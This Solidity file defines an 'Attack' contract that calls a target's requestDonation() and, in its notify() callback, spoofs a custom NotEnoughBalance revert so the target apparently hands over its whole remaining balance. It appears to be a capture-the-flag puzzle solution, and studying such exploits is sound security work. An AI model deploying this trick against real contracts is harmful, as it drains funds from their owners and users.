pragma solidity ^0.8.4;

interface IGood {
    function coin() external view returns (address);
    function requestDonation() external returns (bool enoughBalance);
}

interface ICoin {
    function balances(address) external view returns (uint256);
}

contract Attack {
    IGood private target;
    ICoin private coin;

    error NotEnoughBalance();

    constructor(IGood _target) {
        target = _target;
        coin = ICoin(_target.coin());
    }

    function attack() external {
        target.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
